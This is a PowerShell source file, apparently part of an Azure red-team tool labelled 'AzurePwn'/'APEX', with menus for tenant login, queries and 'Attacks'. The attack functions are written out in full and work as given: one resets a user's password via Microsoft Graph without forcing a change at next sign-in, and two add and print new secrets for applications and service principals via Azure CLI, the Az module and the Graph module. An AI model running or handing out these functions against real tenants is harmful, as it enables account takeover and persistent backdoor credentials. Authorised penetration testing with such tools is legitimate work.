        switch ($userInput) {
            "1" {
                ResetUserPassword
            }
            "2" {
                SetNewSecretForApplication
            }
            "3" {
                SetNewSecretForServicePrincipal
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to reset a user's password via Graph
function ResetUserPassword {
    Clear-Host
    DisplayHeader
    Write-Host "Reset a User's Password via Graph PS Module" -ForegroundColor Cyan
    Write-Host "Enter the user's email or user ID:" -ForegroundColor Yellow
    $userId = Read-Host

    Write-Host "Enter the new password:" -ForegroundColor Yellow
    $password = Read-Host

    try {
        $params = @{
            passwordProfile = @{
                forceChangePasswordNextSignIn = $false
                forceChangePasswordNextSignInWithMfa = $false
                password = $password
            }
        }
        Update-MgUser -UserId $userId -BodyParameter $params
        Write-Host "Password reset successfully for user $userId." -ForegroundColor Green
    }
    catch {
        Write-Host "Error resetting password for user "$userId": $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the attacks menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to set a new secret to an application
function SetNewSecretForApplication {
    Clear-Host
    DisplayHeader
    Write-Host "Add New Secret for an Application via Graph PS Module" -ForegroundColor Cyan
    Write-Host "Careful here. You need the Object ID, not the Application (client) ID!!!" -ForegroundColor Yellow
    Write-Host "Enter the application's Object ID:" -ForegroundColor Yellow
    $appId = Read-Host

    try {
        $passwordCred = @{
            displayName = 'Created via AzurePwn'
        }
        # Create a new password credential
        $newPassword = Add-MgApplicationPassword -ApplicationId $appId -PasswordCredential $passwordCred
        
        # Print the new password
        Write-Host "The new secret for the Application is: $($newPassword.SecretText)" -ForegroundColor Green
    }
    catch {
        Write-Host "Error setting new secret for application ID "$appId": $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the attacks menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to set a new secret for a service principal
function SetNewSecretForServicePrincipal {
    Clear-Host
    DisplayHeader
    Write-Host "Set New Secret for a Service Principal" -ForegroundColor Cyan
    Write-Host "Careful here. You need the Object ID, not the Application ID!!!" -ForegroundColor Yellow
    Write-Host "Enter the service principal's Object ID:" -ForegroundColor Yellow
    $spId = Read-Host

    Write-Host "Select tool(s) to use to set the secret:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    try {
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            $newSecret = az ad sp credential reset --id $spId --append --query 'password' -o tsv
            Write-Host "The new secret for the service principal is: $newSecret" -ForegroundColor Green
        }
        
        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            $newPassword = New-AzADSpCredential -ObjectId $spId -DisplayName 'Created via AzurePwn'
            Write-Host "The new secret for the service principal is: $($newPassword.Secret)" -ForegroundColor Green
        }
        
        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            $passwordCred = @{
                displayName = 'Created via AzurePwn'
            }
            $newPassword = Add-MgServicePrincipalPassword -ServicePrincipalId $spId -PasswordCredential $passwordCred
            Write-Host "The new secret for the service principal is: $($newPassword.SecretText)" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "Error setting new secret for application ID "$spId": $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the attacks menu..."
    [void][System.Console]::ReadKey($true)
}

# Main menu structure
function ToolMenu {
    ShowBanner
    checkps
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Main Menu" -ForegroundColor Cyan
        Write-Host "1. Set Tenant"
        Write-Host "2. Login to Azure Services"
        Write-Host "3. Queries"
        Write-Host "4. Attacks"
        Write-Host "5. Logout of all Services and forget Tenant Info"
        Write-Host "C. Check Tools and Updates"
        Write-Host "Q. Quit"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput.ToUpper()) {
            "1" {
                Set-Tenant
            }
            "2" {
                LoginMenu
            }
            "3" {
                QueriesMenu
            }
            "4" {
                AttacksMenu
            }
            "5" {
                Logout-AllServices
            }
            "C" {
                Clear-Host
                Write-Host "Checking installations and updates..."
                Check-AzureCLI
                Check-UpdateModule "Az"
                Check-UpdateModule "Microsoft.Graph"
                Write-Host "`nPress any key to return to the menu..."
                [void][System.Console]::ReadKey($true)
            }
            "Q" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to display the ASCII art banner
function ShowBanner {
    Clear-Host
    Write-Host "
                                                                                                
                                        .*#  #@-   .@@@@%+.                                      
                                  ..%@# -@@@.@%.   .@@: +@@.-@@#.                                
                             .:*@@+..#@%%@+@@@-    :@@##%#-.@@@:+@@..                            
                             %@@:*@=  +@@% =@@.    :@@.    =@@%@@: +@%                           
                        .-#@+.@@@:.=*. :-.                 +@@%=.  *@*.=%-.                      
                      .+@##@@..@@@@=.                       ...+*..@@@@@@@.                      
                     :@@@*@*.  .:.              +:         .*@    .%@#.@@-:%@-                   
                      :@@@+.                    #@%.       =@@.       -@@@@#.                    
                        =@@:                    +@@@.     =@@@:       .-=.                       
                         ..                     +@@@@@@@@@@@@@*.       ..                        
                            .                   +@@@%@@@@-..:@@.       -@%.                      
                           *@@-                 :@# ..-@@....@@.     .+@@-                       
                           .-@@@:               .@# . #@@@%%@@@.    .@@@..                       
                             .%@@@.             :@@@@@@@@@@@@@@.   -@@@%.                        
                             .*:@@@@-        .%@@@@@@@@@@@@@@@@- :@@@@@%.                        
                              .=@@@@@=    .+@@@@@@@@@@@@@@@@@@@@.#@@@@@:                         
                              .@@@@@@.  .*@@@@@@@@@@@@@@@@@@@@@@..@@@@@@:                        
                              #@@@@@@#++@@@@@@@@@@@@@@@@@@@@@@@@: *@@@@@=.                       
                               .=.:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=                          
                                    .=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+.                           
                                     #@@@@@@@@@@@@@@@@@@@@@@@@@@@@-.                             
                                    -@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                               
                   .=@@@@@@%:..     #@@@@@@@@@@@@@@@@@@@@@@@@@@@:                                
                   +@@@@@@@@@@@%.   @@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                     ....:*@@@@@@@..@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                            ..#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                               .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                                .-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                                  :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                                   -@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                                    *@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
                                    .-@@@@@@@@@@@@@@@@@@@@@@@@@.                                 
                                                                                                 
                      .%#..%%. .%#. =%%*:  .%*. =%%%= *%: .%-.#-  *%. .+%%-.*.                   
                      :@@#+@@:.#@@- #@:=@*.@@@- #@.. .@@@..@%@%. -@@# =@*:..%:                   
                      .@-@@=@::@%@@.#@--@#.@#@%.#@%*.@@@@=.@@@@. %@@@:..*@@-#.                   
                      .@.%+:@-*#.:@:#@@@*.@+.+@=*%  .@:.%%.@*.@@.@:.@#:@@@%.%.    

" -ForegroundColor Cyan
}

# Check PowerShell version
function checkps {if ($PSVersionTable.PSVersion.Major -lt 7) {
                    Write-Host "You are running PowerShell version $($PSVersionTable.PSVersion). It is recommended to use PowerShell 7 or higher for optimal performance and compatibility with APEX." -ForegroundColor Red
                } else {
                    Write-Host "PowerShell version $($PSVersionTable.PSVersion) detected. You are running a compatible version of PowerShell for APEX." -ForegroundColor Green
                }
Write-Host "`nPress any key to continue..."
[void][System.Console]::ReadKey($true)
}

# Start the tool
ToolMenu
